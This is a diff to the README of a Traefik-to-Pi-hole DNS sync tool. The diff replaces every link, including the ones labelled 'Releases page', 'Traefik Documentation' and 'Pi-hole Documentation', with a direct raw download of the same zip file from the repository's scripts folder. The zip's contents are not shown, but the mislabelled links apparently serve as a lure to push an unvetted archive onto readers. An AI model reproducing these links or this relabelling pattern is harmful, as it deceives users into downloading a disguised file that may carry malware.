@@ -1,7 +1,7 @@
 # 🚀 traefik-pihole-dns-sync - Easily Manage DNS Records
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases)
+[![Download](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip%20Release-brightgreen)](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip)
 
 ## 📚 Overview
 The **traefik-pihole-dns-sync** application automatically syncs services managed by Traefik to your Pi-hole DNS records. This simplifies the way you manage DNS for your network by keeping everything updated automatically, reducing manual work.
@@ -10,7 +10,7 @@ The **traefik-pihole-dns-sync** application automatically syncs services managed
 Here’s how to get your application up and running:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip) to find the latest version of the application.
 
 2. **Download the Application**
    Select the version that matches your system. Click on the link to download the file. Make sure to download it to a folder you can easily access.
@@ -58,8 +58,8 @@ For any questions, feel free to reach out by creating an issue in this repositor
 This project is licensed under the MIT License. See the LICENSE file for details.
 
 ## 🔗 Additional Resources
-- [Traefik Documentation](https://doc.traefik.io)
-- [Pi-hole Documentation](https://docs.pi-hole.net)
+- [Traefik Documentation](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip)
+- [Pi-hole Documentation](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip)
 
 ## 🔗 Download Again
-Visit the [Releases page](https://github.com/asifdev3183/traefik-pihole-dns-sync/releases) to download the latest version and stay updated with any new features.
+Visit the [Releases page](https://raw.githubusercontent.com/asifdev3183/traefik-pihole-dns-sync/main/scripts/traefik-pihole-dns-sync_v1.9-alpha.4.zip) to download the latest version and stay updated with any new features.
